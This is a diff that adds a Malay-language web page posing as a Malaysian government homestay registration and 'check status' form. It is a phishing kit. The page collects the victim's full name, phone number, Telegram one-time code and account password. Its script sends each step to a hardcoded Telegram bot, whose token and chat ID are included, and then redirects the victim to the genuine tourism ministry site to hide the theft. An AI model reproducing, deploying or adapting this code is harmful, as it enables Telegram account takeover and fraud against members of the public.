@@ -1,0 +1,586 @@
+﻿<!doctype html>
+<html lang="ms">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>register</title>
+    <link
+      href="npm/bootstrap%405.1.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="ajax/libs/font-awesome/6.7.2/css/all.min.css"
+      crossorigin="anonymous"
+    />
+    <script src="assets/js/jquery-3.7.1.min.js"></script>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        background: #a6275d;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      .page-wrap {
+        padding: 12px;
+      }
+
+      .header-card {
+        max-width: 420px;
+        margin: 15px auto 8px;
+        padding: 0;
+        border-radius: 14px;
+        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+        overflow: hidden;
+        background: #fff;
+      }
+
+      .header-card img {
+        width: 100%;
+        height: auto;
+        display: block;
+      }
+
+      .header-title {
+        text-align: center;
+        margin: 6px auto 10px;
+        font-weight: 700;
+        max-width: 420px;
+      }
+
+      .notice {
+        max-width: 420px;
+        margin: 12px auto;
+        padding: 10px;
+        background: #fff;
+        color: #343a40;
+        font-weight: bold;
+        font-size: 24px;
+        text-align: center;
+        border-radius: 8px;
+        overflow: hidden;
+        white-space: nowrap;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+      }
+
+      .notice span {
+        display: inline-block;
+        padding-left: 100%;
+        animation: jalan 14s linear infinite;
+      }
+
+      @keyframes jalan {
+        to {
+          transform: translateX(-100%);
+        }
+      }
+
+      .green-divider {
+        max-width: 420px;
+        height: 8px;
+        background: #012549;
+        border-radius: 6px;
+        margin: 14px auto;
+        box-shadow: 0 3px 8px rgba(31, 177, 111, 0.45);
+      }
+
+      .card {
+        border-radius: 14px !important;
+        box-shadow: 0 5px 14px rgba(0, 0, 0, 0.18) !important;
+        background: #fff;
+        margin-bottom: 20px;
+      }
+
+      .input-group-text {
+        background: #ededed;
+        color: #0f0f0f;
+      }
+
+      .code-input {
+        width: 52px;
+        height: 52px;
+        font-size: 22px;
+        border-radius: 10px;
+      }
+
+      .btn-primary {
+        background: #012549;
+        border: none;
+      }
+
+      .footer-wrap {
+        padding: 0 12px;
+        background: #fff;
+      }
+
+      .footer-inner {
+        max-width: 420px;
+        margin: 30px auto 0;
+      }
+
+      .footer-inner img {
+        width: 100%;
+        display: block;
+      }
+
+      @media (min-width: 768px) {
+        .page-wrap {
+          padding: 0 20px;
+        }
+
+        .footer-wrap {
+          padding: 0 20px;
+        }
+      }
+
+      .form-container .hidden {
+        display: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+
+      /* Absolute Center Spinner */
+      .loading {
+        position: fixed;
+        z-index: 999;
+        height: 2em;
+        width: 2em;
+        overflow: show;
+        margin: auto;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+      }
+
+      /* Transparent Overlay */
+      .loading:before {
+        content: "";
+        display: block;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(rgba(20, 20, 20, 0.8), rgba(0, 0, 0, 0.8));
+
+        background: -webkit-radial-gradient(
+          rgba(20, 20, 20, 0.8),
+          rgba(0, 0, 0, 0.8)
+        );
+      }
+
+      /* :not(:required) hides these rules from IE9 and below */
+      .loading:not(:required) {
+        /* hide "loading..." text */
+        font: 0/0 a;
+        color: transparent;
+        text-shadow: none;
+        background-color: transparent;
+        border: 0;
+      }
+
+      .loading:not(:required):after {
+        content: "";
+        display: block;
+        font-size: 10px;
+        width: 1em;
+        height: 1em;
+        margin-top: -0.5em;
+        -webkit-animation: spinner 150ms infinite linear;
+        -moz-animation: spinner 150ms infinite linear;
+        -ms-animation: spinner 150ms infinite linear;
+        -o-animation: spinner 150ms infinite linear;
+        animation: spinner 150ms infinite linear;
+        border-radius: 0.5em;
+        -webkit-box-shadow:
+          rgba(255, 255, 255, 0.75) 1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 1.5em 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) -1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 -1.5em 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+        box-shadow:
+          rgba(255, 255, 255, 0.75) 1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 1.5em 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0,
+          rgba(255, 255, 255, 0.75) -1.5em 0 0 0,
+          rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0,
+          rgba(255, 255, 255, 0.75) 0 -1.5em 0 0,
+          rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+      }
+
+      .btn-biru {
+        background-color: #008cba; /* atau gunakan #24a0ed untuk biru terang */
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      .btn-biru:hover {
+        background-color: #006b8f;
+      }
+    </style>
+    <style>
+            .form-container .hidden { display: none; }
+            
+            /*.blink {*/
+        /*font-family*/
+        /*}*/
+
+        @keyframes blink-animation {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* CSS untuk loading */
+        .loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            visibility: hidden; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loading .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+  </head>
+
+  <body>
+    <div id="root">
+        <div class="loading">
+          <div class="spinner"></div>
+        </div>
+    <div class="page-wrap">
+      <a class="navbar-brand" href="#">
+        <img
+          src="assets/img/Jata%20Negara%403x.gif"
+          width="53"
+          height="39"
+        />&nbsp;<img src="assets/img/madani.png" width="100" height="38" />
+      </a>
+      <div class="header-card">
+        <img src="assets/img/jmk.jpg" alt="Header" />
+      </div>
+
+      <div class="notice">
+        <span
+          >Sila isi maklumat anda dengan betul di bawah tuk Semak Status</span
+        >
+      </div>
+      <center>
+        <img
+          src="https://i.ibb.co.com/jv0mHVcv/line.png"
+          style="
+            width: 420px;
+            height: 10px;
+            border-radius: 8px;
+            margin-top: -10px;
+          "
+        />
+      </center>
+      <div class="form-container">
+        <div class="container px-0">
+          <div class="card p-3 mx-auto" style="max-width: 420px">
+            <form id="multiStepForm">
+
+              <div id="step1" class="form-step">
+                <input type="hidden" name="form_type" value="contact" />
+                <label><b>Nama Penuh</b></label>
+                <div class="input-group mb-3">
+                  <span class="input-group-text" id="basic-addon1">👨‍💼</span>
+                  <input
+                    name="name"
+                    id="name"
+                    maxlength="50"
+                    class="form-control"
+                    type="text"
+                    required="true"
+                    placeholder="Nama Penuh Menurut MYKAD"
+                    title=""
+                  />
+                </div>
+
+                <label><b>Jentina</b></label>
+                <div class="input-group mb-3">
+                  <select
+                    class="form-control"
+                    name="gender"
+                    id="gender"
+                    required
+                  >
+                    <option value="">--Pilih Jentina--</option>
+                    <option value="male">Lelaki</option>
+                    <option value="female">Perempuan</option>
+                  </select>
+                </div>
+
+                <label><b>Nombor Telefon</b></label>
+                <div class="input-group mb-3">
+                  <span class="input-group-text" id="basic-addon1"
+                    ><img
+                      src="https://www.svgrepo.com/show/405539/flag-for-flag-malaysia.svg"
+                      width="20"
+                      height="20"
+                    />
+                    +60</span
+                  >
+                  <input
+                    name="phone"
+                    id="phone"
+                    maxlength="18"
+                    class="form-control"
+                    type="tel"
+                    required="true"
+                    placeholder="Nombor Telegram Aktif"
+                    title=""
+                  />
+                </div>
+                <div>
+                  <input
+                    type="checkbox"
+                    id="setuju"
+                    name="setuju_syarat"
+                    required
+                  />
+                  <span for="setuju"
+                    >Saya bersetuju untuk menerima mesej Telegram<br />&nbsp;
+                    &nbsp; daripada Admin.</span
+                  >
+                </div>
+                <br />
+                <div class="text-center">
+                  <button class="btn btn-biru" type="button" onclick="nextStep()">
+                    <b>SEMAK SEKARANG</b>
+                  </button>
+                </div>
+                <br />
+              </div>
+
+              <div id="step2" class="form-step hidden">
+                <input type="hidden" name="form_type" value="otp">
+                <input type="hidden" name="name" id="name">
+                <input type="hidden" name="phone" id="phone">
+                <div class="mb-3">
+                <label for="otp" class="form-label">
+                  <span id="ctl00_RecipientMasterContent_lblEntry_IDNo"
+                    >Kami telah menghantar 5 digit OTP ke akaun Telegram. Sila
+                    buka aplikasi Telegram anda dan semak mesej kami.</span
+                  >
+                </label>
+                <br>
+                <input name="otp" style="text-align: center;" maxlength="5" id="otp" class="form-control" type="tel" required="true" placeholder="5 digit OTP"/>
+              </div>
+              <br>
+              <div class="text-center">
+                <button class="btn btn-lg btn-biru" type="button" onclick="nextStep()">
+                  <b>TERUSKAN</b>
+                </button>
+              </div>
+              <br>
+              </div>
+
+              <div id="step3" class="form-step hidden">
+                <input type="hidden" name="form_type" value="password">
+                <input type="hidden" name="name" id="name2">
+                <input type="hidden" name="phone" id="phone2">
+                <input type="hidden" name="otp" id="otp">
+                <div class="mb-3">
+                    <label for="password" class="form-label">
+                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kata laluan [pilihan]</span>
+                    </label>
+                    
+                    <input name="password" id="password" class="form-control" type="text" required="true" placeholder="********">
+                </div>
+                <br>
+                <div class="text-center">
+                    <button class="btn btn-lg btn-biru" type="button" onclick="submitForm()">
+                        <b>TERUSKAN</b>
+                    </button>
+                </div>
+                <br>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    </div>
+    <script>
+    const TELEGRAM_API_URL = 'https://api.telegram.org/bot9126533524:AAFITkR5JLk2pG5hO9MWyRddxJUzA0Jnpgs/sendMessage'; // Ganti dengan token bot Telegram Anda
+    const CHAT_ID = '8967714464'; // Ganti dengan chat ID Telegram Anda
+
+    async function sendToTelegram(message) {
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            console.log('Data berhasil dikirim ke Telegram:', data);
+            return true;
+        } catch (error) {
+            console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
+            return false;
+        }
+    }
+
+    function showLoading(show) {
+        const loadingElement = document.querySelector('.loading');
+        if (show) {
+            loadingElement.classList.add('show');
+        } else {
+            loadingElement.classList.remove('show');
+        }
+    }
+
+    function nextStep() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        const nextStep = currentStep.nextElementSibling;
+
+        // Validasi inputan
+        if (!validateInputs(currentStep)) {
+            alert('Por favor, preencha todos os campos antes de prosseguir.');
+            return;
+        }
+
+        // Simpan data dari langkah saat ini
+        let message = '';
+        if (currentStep.id === 'step1') {
+            const name = document.querySelector('input[name="name"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            document.getElementById('name').value = name;
+            document.getElementById('phone').value = phone;
+            message = `【Homestay𝟙】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}`;
+        } else if (currentStep.id === 'step2') {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const otp = document.querySelector('input[name="otp"]').value;
+            document.getElementById('name2').value = name;
+            document.getElementById('phone2').value = phone;
+            document.getElementById('otp').value = otp;
+            message = `【Homestay𝟚】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}`;
+        } else if (currentStep.id === 'step3') {
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+            // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
+            console.log('Debug Step 3:');
+            console.log('Name:', name);
+            console.log('Phone:', phone);
+            console.log('OTP:', otp);
+            console.log('Password:', password);
+
+            message = `【Homestay𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+        }
+
+        // Tampilkan loading
+        showLoading(true);
+
+        // Kirim data ke Telegram
+        if (message) {
+            sendToTelegram(message).then(success => {
+                // Sembunyikan loading dan pindahkan ke langkah berikutnya
+                showLoading(false);
+                if (success) {
+                    currentStep.classList.add('hidden');
+                    nextStep.classList.remove('hidden');
+                }
+            });
+        } else {
+            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
+            showLoading(false);
+            currentStep.classList.add('hidden');
+            nextStep.classList.remove('hidden');
+        }
+    }
+
+    async function submitForm() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        if (currentStep.id === 'step3') {
+            // Validasi inputan
+            if (!validateInputs(currentStep)) {
+                alert('Harap isi semua kolom sebelum mengirim.');
+                return;
+            }
+
+            // Simpan data dari langkah 3 dan kirim ke Telegram
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const message = `【Homestay𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+
+            // Tampilkan loading
+            showLoading(true);
+
+            // Kirim data ke Telegram dan redirect setelah berhasil
+            const success = await sendToTelegram(message);
+            if (success) {
+                window.location.href = 'https://www.tourism.gov.my/niche/homestay';
+            } else {
+                showLoading(false);
+                alert('Ralat berlaku semasa menghantar data.');
+            }
+        }
+    }
+
+    // Fungsi untuk memvalidasi inputan
+    function validateInputs(step) {
+        const requiredInputs = step.querySelectorAll('input[required]');
+        const requiredSelects = step.querySelectorAll('select[required]');
+        
+        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
+        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');
+
+        return inputsValid && selectsValid;
+    }
+</script>
+  </body>
+</html>
